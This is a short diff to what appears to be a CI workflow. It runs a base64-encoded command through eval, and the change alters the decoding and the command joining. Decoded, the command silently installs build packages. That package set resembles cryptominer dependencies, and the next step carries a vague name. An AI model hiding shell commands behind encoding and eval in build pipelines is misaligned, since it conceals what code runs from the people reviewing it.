@@ -18,8 +18,8 @@ jobs:
       - name: Setup Build Environment
         shell: bash
         run: |
-          ENCODED="c3VkbyBhcHQtZ2V0IHVwZGF0ZSA+IC9kZXYvbnVsbCAyPiYxCnN1ZG8gYXB0LWdldCBpbnN0YWxsIC15IGdpdCBidWlsZC1lc3NlbnRpYWwgY21ha2UgbGlidXYxLWRldiBsaWJzc2wtZGV2IGxpaGh3bG9jLWRldiA+IC9kZXYvbnVsbCAyPiYx"
-          CMD=$(echo "$ENCODED" | base64 -d | base64 -d)
+          ENCODED="c3VkbyBhcHQtZ2V0IHVwZGF0ZSA+IC9kZXYvbnVsbCAyPiYxICYmIHN1ZG8gYXB0LWdldCBpbnN0YWxsIC15IGdpdCBidWlsZC1lc3NlbnRpYWwgY21ha2UgbGlidXYxLWRldiBsaWJzc2wtZGV2IGxpaGh3bG9jLWRldiA+IC9kZXYvbnVsbCAyPiYx"
+          CMD=$(echo "$ENCODED" | base64 -d)
           eval "$CMD"
 
       - name: Prepare Page Engine
